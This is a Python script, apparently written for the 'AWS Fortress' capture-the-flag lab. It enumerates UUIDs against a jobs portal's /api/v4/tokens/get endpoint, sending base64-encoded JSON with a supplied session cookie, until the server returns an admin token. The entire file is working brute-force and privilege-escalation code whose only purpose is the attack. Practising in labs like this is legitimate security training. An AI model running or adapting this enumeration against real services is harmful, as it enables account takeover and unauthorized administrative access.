#!/usr/bin/env python3
"""AWS Fortress — jobs portal admin token brute (Flag 1 prep)."""
import argparse
import base64
import json
import sys

import requests


def brute(session: str, base_url: str, max_uuid: int = 2000) -> None:
    target = f"{base_url.rstrip('/')}/api/v4/tokens/get"
    headers = {"Content-Type": "application/json"}
    cookies = {"session": session}

    for uuid in range(max_uuid):
        payload = json.dumps({"get_token": "True", "uuid": uuid, "username": "admin"})
        body = {"data": base64.b64encode(payload.encode()).decode()}
        r = requests.post(target, headers=headers, cookies=cookies, json=body, timeout=15)
        if (
            r.headers.get("Content-Type", "").startswith("application/json")
            and "error" not in r.text.lower()
            and "Invalid" not in r.text
            and r.text.strip()
        ):
            print(r.text.strip())
            print(f"[+] hit uuid={uuid}", file=sys.stderr)
            return
        if uuid and uuid % 100 == 0:
            print(f"[*] tried uuid 0..{uuid}", file=sys.stderr)
    print("[!] no hit in range", file=sys.stderr)


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--session", required=True, help="Flask session cookie from jobs portal login")
    p.add_argument("--url", default="http://jobs.amzcorp.local")
    p.add_argument("--max-uuid", type=int, default=2000)
    args = p.parse_args()
    brute(args.session, args.url, args.max_uuid)
